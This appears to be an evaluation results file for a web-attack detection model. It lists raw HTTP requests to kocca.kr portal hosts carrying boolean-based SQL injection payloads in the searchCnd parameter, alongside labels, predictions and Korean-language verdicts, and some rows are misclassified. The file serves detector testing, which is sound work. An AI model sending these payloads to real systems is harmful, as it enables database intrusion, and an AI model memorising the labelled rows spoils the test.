Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
14081,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%203006%3D3006%20AND%20%28%28%288828%3D8828&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20110518 Firefox/4.0.1\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=RGhmgkPdM6RfnKQFBSjyJ2xLpYDLKSpLZpQXHfynfyN7QbnhB1Dh!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%29%29%20AND%203006%3D3006%20AND%20%28%28%288828%3D8828
공격 유형 : SQL Injection"
17583,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%20AND%208348%3D8348%20AND%20%28%28%22HqHj%22%20LIKE%20%22HqHj&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.3) Gecko/20070310 Firefox/2.0.0.3 (Debian-2.0.0.3-2)\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=tJhHgkrpLT9xx2LLHFb9DyT1vWJGtWzRzvfTQ04xLMPJC1dcYNJh!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%22%29%29%20AND%208348%3D8348%20AND%20%28%28%22HqHj%22%20LIKE%20%22HqHj
공격 유형 : SQL Injection"
4799,"GET /portal/bbs/list/B0000204.do?searchCnd=%22%20AND%209847%3D6191%20AND%20%22DIGG%22%20LIKE%20%22DIGG&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\r\nReferer: http://bestgame.kocca.kr:80/portal/bbs/list/B0000204.do\r\nHost: bestgame.kocca.kr\r\nCookie: KCSESSIONID=RyRLgt7ptTh19xNyHSHGnrRY5j7jhq5XrCGz2yP3H4WhR0Hs0QGL!1739629523!965280821\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%22%20AND%209847%3D6191%20AND%20%22DIGG%22%20LIKE%20%22DIGG
공격 유형 : SQL Injection"
13028,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%29%20AND%207854%3D7676%20AND%20%28%28%28%27uDKD%27%20LIKE%20%27uDKD&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %27%29%29%29%20AND%207854%3D7676%20AND%20%28%28%28%27uDKD%27%20LIKE%20%27uDKD
공격 유형 : SQL Injection"
25886,"GET /cop/bbs/view/B0000144/1818887.do?searchCnd=%22%29%20AND%202456%3D2456%20AND%20%28%22Pjik%22%3D%22Pjik&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200900&categorys=0&subcate=0&cateCode=&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12\r\nCookie: KCSESSIONID=LBJ0grLQjQPF7t4c0ZhQSmZTFvf0vh3LKlBvrgGTG1H1JrGG7skv!-368784361!385399486\r\nHost: m.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%22%29%20AND%202456%3D2456%20AND%20%28%22Pjik%22%3D%22Pjik
공격 유형 : SQL Injection"
2197,"GET /portal/bbs/view/B0158919/1939242.do;KCSESSIONID=4sT3d50LjFLBg0sVtcKwn0nXfmY2vv8lJdQQ7CggG0QtM8Hj6zGJ!-1779590607!1536097409?searchCnd=%20AND%201437%3D1437&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=203296&categorys=1&subcate=0&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=%2C127&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060309 Linux Mint/5 (Elyssa) Firefox/3.0.11\r\nCookie: KCSESSIONID=mxQygskLYMTxYbfQBqXMq3jLPLmck3GwgnV0wnb77BGJ22y9SFvF!1739629523!965280821\r\nHost: kocca.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,0,False,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
32577,"GET /cop/bbs/view/B0000144/1818887.do?searchCnd=%22%29%20AND%205085%3D9983%20AND%20%28%22bkNw%22%3D%22bkNw&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200900&categorys=0&subcate=0&cateCode=&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12\r\nCookie: KCSESSIONID=LBJ0grLQjQPF7t4c0ZhQSmZTFvf0vh3LKlBvrgGTG1H1JrGG7skv!-368784361!385399486\r\nHost: m.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %22%29%20AND%205085%3D9983%20AND%20%28%22bkNw%22%3D%22bkNw
공격 유형 : SQL Injection"
6332,"GET /portal/bbs/view/B0000204/1946051.do?searchCnd=%27%29%29%20AND%201645%3D2382%20AND%20%28%28%27mZxS%27%3D%27mZxS&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200253&categorys=4&subcate=67&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=3 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4\r\nCookie: KCSESSIONID=HMdkgrcLBLfjRfnsXWqMQ0Q5bvQSDwH1hgGw4Tk1WbJQDcMHnVnX!-368784361!385399486\r\nHost: sso.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%27%29%29%20AND%201645%3D2382%20AND%20%28%28%27mZxS%27%3D%27mZxS
공격 유형 : SQL Injection"
8899,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%20WHERE%207087%3D7087%20AND%209433%3D7375--%20sWzq&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : WHERE 7087=7087 AND 9433=7375-- sWzq
공격 유형 : SQL Injection"
28122,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%20AND%203911%3D7693--%20odwz&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,0,False,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
3888,"GET /portal/bbs/list/B0000204.do?searchCnd=%27%20AND%207475%3D5074%20AND%20%27THWg%27%3D%27THWg&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.9.0.5) Gecko/2008121622 Ubuntu/8.10 (intrepid) Firefox/3.0.5\r\nCookie: KCSESSIONID=SCLJgspJkpQm0nZ7qsJ47gttH6Qb2MLWZh1KT3yYGnhjJ3q01lz1!1739629523!965280821\r\nHost: bestgame.kocca.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : AND 7475=5074 AND 'THWg'='THWg
공격 유형 : SQL Injection"
28749,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%20WHERE%207797%3D7797%20AND%202916%3D2119--%20RHTy&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : WHERE 7797=7797 AND 2916=2119--
공격 유형 : SQL Injection"
22139,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%20AND%209373%3D8561%20AND%20%27yfrF%27%20LIKE%20%27yfrF&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %27%20AND%209373%3D8561%20AND%20%27yfrF%27%20LIKE%20%27yfrF
공격 유형 : SQL Injection"
